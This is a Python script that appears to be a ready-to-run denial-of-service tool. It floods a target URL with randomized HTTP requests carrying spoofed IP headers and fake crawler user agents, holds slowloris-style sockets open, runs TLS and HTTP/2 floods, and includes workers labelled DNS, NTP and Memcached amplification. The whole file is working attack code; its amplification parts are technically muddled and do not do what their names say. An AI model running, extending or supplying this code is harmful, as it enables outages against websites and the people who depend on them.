import asyncio,aiohttp,random,string,sys,time,json,ssl,urllib.parse
from concurrent.futures import ThreadPoolExecutor,ProcessPoolExecutor
from multiprocessing import cpu_count,Manager,Process,Value,Array
import socket,struct,ctypes,hashlib,threading,zlib,gzip,io,http.client,requests,urllib3,certifi,chardet
from collections import deque
from itertools import cycle

urllib3.disable_warnings()

TARGET=sys.argv[1] if len(sys.argv)>1 else None
THREADS=int(sys.argv[2]) if len(sys.argv)>2 else 9999
DURATION=int(sys.argv[3]) if len(sys.argv)>3 else 999999

if not TARGET:
 print("Usage: python d.py <url> [threads] [duration]");sys.exit(1)

UA=[
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
 "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
 "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
 "Mozilla/5.0 (Android 14; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0",
 "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.146 Mobile Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.85",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
 "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
 "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
 "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
 "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
 "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
 "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
 "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; +https://moz.com/help/guides/meta-tags)",
 "curl/8.4.0",
 "Wget/1.21.4",
 "Python-urllib/3.12",
 "Go-http-client/2.0",
 "Java/17.0.9",
 "libwww-perl/6.72",
]

RF=[
 "https://www.google.com/search?q=",
 "https://www.facebook.com/sharer/sharer.php?u=",
 "https://twitter.com/intent/tweet?url=",
 "https://www.reddit.com/submit?url=",
 "https://www.linkedin.com/sharing/share-offsite/?url=",
 "https://t.me/share/url?url=",
 "https://api.whatsapp.com/send?text=",
 "https://pinterest.com/pin/create/button/?url=",
 "https://www.tumblr.com/share/link?url=",
 "https://www.blogger.com/blog-this.g?u=",
 "https://www.digg.com/submit?url=",
 "https://www.stumbleupon.com/submit?url=",
 "https://delicious.com/save?v=5&noui&jump=close&url=",
 "https://www.bibsonomy.org/url?url=",
 "https://www.evernote.com/clip.action?url=",
 "https://getpocket.com/edit?url=",
 "https://www.instapaper.com/hello2?url=",
 TARGET
]

def rs(l=16):
 return ''.join(random.choices(string.ascii_lowercase+string.digits,k=l))

def ri():
 return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def rp(bp=""):
 d=random.randint(1,8)
 sg=[rs(random.randint(5,30)) for _ in range(d)]
 return bp+"/"+"/".join(sg)

def rh(ssl_bool):
 h={
  "User-Agent":random.choice(UA),
  "Accept":random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","*/*"]),
  "Accept-Language":random.choice(["en-US,en;q=0.9","fr-FR,fr;q=0.9","de-DE,de;q=0.9","ja-JP,ja;q=0.9","es-ES,es;q=0.9","pt-BR,pt;q=0.9","ru-RU,ru;q=0.9","zh-CN,zh;q=0.9","ar-SA,ar;q=0.9","hi-IN,hi;q=0.9"]),
  "Accept-Encoding":random.choice(["gzip, deflate, br","gzip, deflate","gzip, deflate, br, zstd","deflate, gzip","compress, gzip"]),
  "Cache-Control":random.choice(["no-cache","no-store","max-age=0","private","must-revalidate","proxy-revalidate","s-maxage=0","no-transform"]),
  "Connection":random.choice(["keep-alive","close"]),
  "Pragma":random.choice(["no-cache",""]),
  "DNT":random.choice(["1","0"]),
  "Upgrade-Insecure-Requests":"1",
  "Sec-Fetch-Dest":random.choice(["document","iframe","empty","frame","object"]),
  "Sec-Fetch-Mode":random.choice(["navigate","same-origin","no-cors","cors","websocket"]),
  "Sec-Fetch-Site":random.choice(["same-origin","cross-site","none","same-site"]),
  "Sec-Fetch-User":"?1",
  "X-Forwarded-For":ri(),
  "X-Real-IP":ri(),
  "X-Client-IP":ri(),
  "Forwarded":f"for={ri()};proto=http;by={ri()}",
  "Via":f"1.1 {rs(12)}",
  "X-Request-ID":rs(24),
  "CF-Connecting-IP":ri(),
  "True-Client-IP":ri(),
  "X-Originating-IP":ri(),
  "X-Remote-IP":ri(),
  "X-Remote-Addr":ri(),
  "X-HackerAI":rs(32),
 }
 if random.random()<0.5:
  h["Referer"]=random.choice(RF)+rs(12)
 if random.random()<0.3:
  h["X-Custom-Header"]=rs(40)
 if random.random()<0.2:
  h["Authorization"]=f"Bearer {rs(64)}"
 if random.random()<0.1:
  h["Cookie"]="; ".join([f"{rs(10)}={rs(20)}" for _ in range(random.randint(5,15))])
 if random.random()<0.1:
  h["X-CSRF-Token"]=rs(48)
 if random.random()<0.05:
  h["Origin"]=random.choice(["https://www.google.com","https://www.facebook.com","https://twitter.com","https://www.reddit.com","https://github.com","https://stackoverflow.com"])
 return h

def gp(t):
 p=urllib.parse.urlparse(t)
 bp=p.path if p.path else "/"
 path=rp(bp)
 params={rs(6):rs(12) for _ in range(random.randint(5,15))}
 if random.random()<0.7:
  path+="?"+urllib.parse.urlencode(params)
 h=rh(t.startswith("https"))
 return "GET",h,None

def pp(t):
 p=urllib.parse.urlparse(t)
 bp=p.path if p.path else "/"
 path=rp(bp)
 h=rh(t.startswith("https"))
 ct=random.choice([
  "application/x-www-form-urlencoded",
  "multipart/form-data; boundary="+rs(24),
  "application/json",
  "text/plain",
  "application/xml",
  "application/graphql",
  "application/octet-stream"
 ])
 h["Content-Type"]=ct
 size=random.randint(500,50000)
 if "json" in ct:
  d={rs(12):rs(size//5) for _ in range(20)}
  data=json.dumps(d)
 elif "form-urlencoded" in ct:
  data=urllib.parse.urlencode({rs(10):rs(100) for _ in range(size//15)})
 elif "multipart" in ct:
  b=h["Content-Type"].split("boundary=")[1]
  data=""
  for _ in range(random.randint(3,10)):
   data+=f"--{b}\r\nContent-Disposition: form-data; name=\"{rs(10)}\"; filename=\"{rs(8)}.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n{rs(size//5)}\r\n"
  data+=f"--{b}--"
 elif "xml" in ct:
  data=f"<?xml version=\"1.0\"?><root>{''.join([f'<{rs(8)}>{rs(20)}</{rs(8)}>' for _ in range(30)])}</root>"
 elif "graphql" in ct:
  data=json.dumps({"query":f"query {{ {rs(8)}(id: \"{rs(16)}\") {{ {rs(8)} {rs(8)} {rs(8)} }} }}","variables":{rs(8):rs(16)}})
 else:
  data=rs(size)
 return "POST",h,data.encode() if isinstance(data,str) else data

def sp(t):
 p=urllib.parse.urlparse(t)
 bp=p.path if p.path else "/"
 path=rp(bp)
 h=rh(t.startswith("https"))
 h["Content-Type"]="application/x-www-form-urlencoded"
 data=urllib.parse.urlencode({rs(8):rs(5000) for _ in range(50)})
 return "PUT",h,data.encode()

def dp(t):
 p=urllib.parse.urlparse(t)
 bp=p.path if p.path else "/"
 path=rp(bp)
 h=rh(t.startswith("https"))
 return "DELETE",h,None

def opt(t):
 h=rh(t.startswith("https"))
 h["Origin"]="https://evil.com"
 return "OPTIONS",h,None

def patchp(t):
 p=urllib.parse.urlparse(t)
 bp=p.path if p.path else "/"
 path=rp(bp)
 h=rh(t.startswith("https"))
 h["Content-Type"]="application/json"
 data=json.dumps({"op":"replace","path":f"/{rs(8)}","value":rs(100)})
 return "PATCH",h,data.encode()

def headp(t):
 h=rh(t.startswith("https"))
 return "HEAD",h,None

def gqlp(t):
 p=urllib.parse.urlparse(t)
 bp=p.path if p.path else "/"
 path=rp(bp)
 h=rh(t.startswith("https"))
 h["Content-Type"]="application/json"
 queries=[
  f"query {{ {rs(8)}(id: \"{rs(16)}\") {{ id name email {rs(8)} {rs(8)} }} }}",
  f"mutation {{ {rs(8)}(input: {{name: \"{rs(10)}\", email: \"{rs(8)}@{rs(6)}.com\"}}) {{ id name }} }}",
  f"subscription {{ {rs(8)} {{ {rs(8)} {rs(8)} }} }}"
 ]
 data=json.dumps({"query":random.choice(queries),"variables":{rs(8):rs(16)}, "operationName":rs(12)})
 return "POST",h,data.encode()

methods=[gp,pp,sp,dp,opt,patchp,headp,gqlp]
method_weights=[0.25,0.3,0.1,0.05,0.05,0.05,0.1,0.1]

class RawSocketFlood:
 def __init__(self,target,numsocks,duration):
  self.target=target
  self.numsocks=numsocks
  self.duration=duration
  self.parsed=urllib.parse.urlparse(target)
  self.host=self.parsed.hostname
  self.port=self.parsed.port or (443 if self.parsed.scheme=="https" else 80)
  self.ssl=self.parsed.scheme=="https"
  self.path=self.parsed.path if self.parsed.path else "/"
  
 def run(self):
  end=time.time()+self.duration
  socks=[]
  for _ in range(self.numsocks):
   try:
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.settimeout(5)
    if self.ssl:
     ctx=ssl.create_default_context()
     ctx.check_hostname=False
     ctx.verify_mode=ssl.CERT_NONE
     sock=ctx.wrap_socket(sock,server_hostname=self.host)
    sock.connect((self.host,self.port))
    ip=ri()
    req=f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {random.choice(UA)}\r\nX-Forwarded-For: {ip}\r\nX-Real-IP: {ip}\r\nAccept: */*\r\nConnection: keep-alive\r\n"
    sock.send(req.encode())
    socks.append(sock)
   except:
    pass
  while time.time()<end and socks:
   for sock in socks[:]:
    try:
     h=f"X-{rs(12)}: {rs(500)}\r\n"
     sock.send(h.encode())
    except:
     socks.remove(sock)
     try:sock.close()
     except:pass
     try:
      sock2=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      sock2.settimeout(5)
      if self.ssl:
       ctx2=ssl.create_default_context()
       ctx2.check_hostname=False
       ctx2.verify_mode=ssl.CERT_NONE
       sock2=ctx2.wrap_socket(sock2,server_hostname=self.host)
      sock2.connect((self.host,self.port))
      sock2.send(req.encode())
      socks.append(sock2)
     except:pass
   time.sleep(3)
  for sock in socks:
   try:sock.close()
   except:pass

class HTTP2Flood:
 def __init__(self,target,threads,duration):
  self.target=target
  self.threads=threads
  self.duration=duration
  
 def run(self):
  try:
   import hyper
   from hyper import HTTP20Connection
   def h2worker():
    end=time.time()+self.duration
    while time.time()<end:
     try:
      conn=HTTP20Connection(self.target.replace("https://","").replace("http://","").split("/")[0],secure=self.target.startswith("https"))
      path=rp("/")
      h=[
       (':method','GET'),
       (':path',path),
       (':authority',urllib.parse.urlparse(self.target).hostname),
       (':scheme','https' if self.target.startswith("https") else 'http'),
       ('user-agent',random.choice(UA)),
       ('accept','*/*'),
       ('x-forwarded-for',ri()),
      ]
      conn.request('GET',path,headers=h)
      resp=conn.get_response()
      resp.read()
      conn.close()
     except:
      pass
   with ThreadPoolExecutor(max_workers=self.threads) as ex:
    futures=[ex.submit(h2worker) for _ in range(self.threads)]
    time.sleep(self.duration)
  except ImportError:
   pass

class SSLSledgehammer:
 def __init__(self,target,threads,duration):
  self.target=target
  self.threads=threads
  self.duration=duration
  
 def run(self):
  p=urllib.parse.urlparse(self.target)
  host=p.hostname
  port=p.port or 443
  def ssl_worker():
   end=time.time()+self.duration
   ctx=ssl.create_default_context()
   ctx.check_hostname=False
   ctx.verify_mode=ssl.CERT_NONE
   ctx.set_ciphers('ALL:COMPLEMENTOFALL:!eNULL:!aNULL')
   while time.time()<end:
    try:
     sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     sock.settimeout(10)
     ssock=ctx.wrap_socket(sock,server_hostname=host)
     ssock.connect((host,port))
     ssock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
     ssock.close()
    except:
     pass
  with ThreadPoolExecutor(max_workers=self.threads) as ex:
   futures=[ex.submit(ssl_worker) for _ in range(self.threads)]
   time.sleep(self.duration)

class DNSAmplification:
 def __init__(self,target,threads,duration):
  self.target=target
  self.threads=threads
  self.duration=duration
  self.dns_servers=[
   "8.8.8.8","8.8.4.4","1.1.1.1","1.0.0.1","208.67.222.222","208.67.220.220",
   "9.9.9.9","149.112.112.112","64.6.64.6","64.6.65.6"
  ]
  
 def run(self):
  p=urllib.parse.urlparse(self.target)
  host=socket.gethostbyname(p.hostname)
  def dns_worker():
   end=time.time()+self.duration
   while time.time()<end:
    try:
     dns=random.choice(self.dns_servers)
     sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     tid=random.randint(1,65535)
     payload=struct.pack(">H",tid)+struct.pack(">H",0x0100)+struct.pack(">H",1)+struct.pack(">H",0)+struct.pack(">H",0)+struct.pack(">H",0)
     for part in host.split('.'):
      payload+=struct.pack("B",len(part))+part.encode()
     payload+=struct.pack("B",0)
     payload+=struct.pack(">H",1)+struct.pack(">H",1)
     sock.sendto(payload,(dns,53))
     sock.close()
    except:
     pass
  with ThreadPoolExecutor(max_workers=self.threads) as ex:
   futures=[ex.submit(dns_worker) for _ in range(self.threads)]
   time.sleep(self.duration)

class NTPAmplification:
 def __init__(self,target,threads,duration):
  self.target=target
  self.threads=threads
  self.duration=duration
  self.ntp_servers=[
   "pool.ntp.org","time.google.com","time.windows.com","time.apple.com",
   "time.cloudflare.com","ntp.ubuntu.com","0.pool.ntp.org","1.pool.ntp.org"
  ]
  
 def run(self):
  p=urllib.parse.urlparse(self.target)
  host=socket.gethostbyname(p.hostname)
  def ntp_worker():
   end=time.time()+self.duration
   req=b'\x17\x00\x03\x2a'+b'\x00'*4
   while time.time()<end:
    try:
     ntp=random.choice(self.ntp_servers)
     sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     sock.sendto(req*10,(ntp,123))
     sock.close()
    except:
     pass
  with ThreadPoolExecutor(max_workers=self.threads) as ex:
   futures=[ex.submit(ntp_worker) for _ in range(self.threads)]
   time.sleep(self.duration)

class MemcachedAmplification:
 def __init__(self,target,threads,duration):
  self.target=target
  self.threads=threads
  self.duration=duration
  
 def run(self):
  p=urllib.parse.urlparse(self.target)
  host=socket.gethostbyname(p.hostname)
  def mem_worker():
   end=time.time()+self.duration
   while time.time()<end:
    try:
     sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     payload=b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
     sock.sendto(payload,(host,11211))
     sock.close()
    except:
     pass
  with ThreadPoolExecutor(max_workers=self.threads) as ex:
   futures=[ex.submit(mem_worker) for _ in range(self.threads)]
   time.sleep(self.duration)

async def af(session,target,weights,stats,stop):
 while not stop.value:
  try:
   m=random.choices(methods,weights=weights,k=1)[0]
   http_m,h,d=m(target)
   if http_m=="GET":
    async with session.get(target,headers=h,timeout=aiohttp.ClientTimeout(total=0.5)) as r:
     await r.read()
   elif http_m=="POST":
    async with session.post(target,headers=h,data=d,timeout=aiohttp.ClientTimeout(total=0.5)) as r:
     await r.read()
   elif http_m=="PUT":
    async with session.put(target,headers=h,data=d,timeout=aiohttp.ClientTimeout(total=0.5)) as r:
     await r.read()
   elif http_m=="DELETE":
    async with session.delete(target,headers=h,timeout=aiohttp.ClientTimeout(total=0.5)) as r:
     await r.read()
   elif http_m=="PATCH":
    async with session.patch(target,headers=h,data=d,timeout=aiohttp.ClientTimeout(total=0.5)) as r:
     await r.read()
   elif http_m=="OPTIONS":
    async with session.options(target,headers=h,timeout=aiohttp.ClientTimeout(total=0.5)) as r:
     await r.read()
   elif http_m=="HEAD":
    async with session.head(target,headers=h,timeout=aiohttp.ClientTimeout(total=0.5)) as r:
     pass
   stats["r"]+=1
   if d:stats["b"]+=len(d)
  except:
   stats["e"]+=1

def wp(pid,target,nc,duration,stats,stop):
 async def wr():
  conn=aiohttp.TCPConnector(limit=nc,limit_per_host=nc,force_close=True,enable_cleanup_closed=True,ttl_dns_cache=0,ssl=False)
  async with aiohttp.ClientSession(connector=conn) as session:
   tasks=[]
   for _ in range(nc):
    tasks.append(asyncio.create_task(af(session,target,method_weights,stats,stop)))
   await asyncio.sleep(duration)
   stop.value=True
   for t in tasks:
    t.cancel()
   await asyncio.gather(*tasks,return_exceptions=True)
 asyncio.run(wr())

def run(target,threads,duration):
 print(f"TARGET: {target}")
 print(f"THREADS: {threads}")
 print(f"DURATION: {duration}s")
 print(f"CPUS: {cpu_count()}")
 print("STARTING ULTRA MAX ATTACK...")
 
 np=min(cpu_count()*2,8)
 cpp=threads//np
 rem=threads%np
 
 mgr=Manager()
 stats=mgr.dict()
 stats["r"]=0
 stats["b"]=0
 stats["e"]=0
 stats["st"]=time.time()
 
 stop=Value('b',False)
 procs=[]
 
 sl_conns=min(2000,threads//2)
 slt=ThreadPoolExecutor(max_workers=4)
 slt.submit(RawSocketFlood(target,sl_conns,duration).run)
 
 try:
  h2t=ThreadPoolExecutor(max_workers=2)
  h2t.submit(HTTP2Flood(target,min(500,threads),duration).run)
 except:pass
 
 sslt=ThreadPoolExecutor(max_workers=4)
 sslt.submit(SSLSledgehammer(target,min(1000,threads),duration).run)
 
 try:
  dnst=ThreadPoolExecutor(max_workers=2)
  dnst.submit(DNSAmplification(target,min(500,threads),duration).run)
 except:pass
 
 try:
  ntpt=ThreadPoolExecutor(max_workers=2)
  ntpt.submit(NTPAmplification(target,min(500,threads),duration).run)
 except:pass
 
 try:
  memt=ThreadPoolExecutor(max_workers=2)
  memt.submit(MemcachedAmplification(target,min(500,threads),duration).run)
 except:pass
 
 for i in range(np):
  c=cpp+(1 if i<rem else 0)
  p=Process(target=wp,args=(i,target,c,duration,stats,stop))
  p.start()
  procs.append(p)
 
 try:
  st=time.time()
  while time.time()-st<duration:
   el=time.time()-st
   r=stats["r"]
   e=stats["e"]
   b=stats["b"]
   rps=r/el if el>0 else 0
   mbs=(b/1024/1024)/el if el>0 else 0
   bar='#'*int(30*el/duration)+'-'*int(30*(1-el/duration))
   sys.stdout.write(f"\r[{bar}] {int(100*el/duration)}% | R:{r} | E:{e} | RPS:{rps:.0f} | MB/s:{mbs:.2f}")
   sys.stdout.flush()
   time.sleep(0.5)
 except KeyboardInterrupt:
  print("\nSTOPPED")
 
 stop.value=True
 for p in procs:
  p.terminate()
  p.join()
 
 el=time.time()-stats["st"]
 print(f"\n\nREQUESTS: {stats['r']}")
 print(f"ERRORS: {stats['e']}")
 print(f"DATA: {stats['b']/1024/1024:.2f} MB")
 print(f"AVG RPS: {stats['r']/el:.0f}")
 print(f"DURATION: {el:.2f}s")
 print("ATTACK COMPLETE")

if __name__=="__main__":
 run(TARGET,THREADS,DURATION)
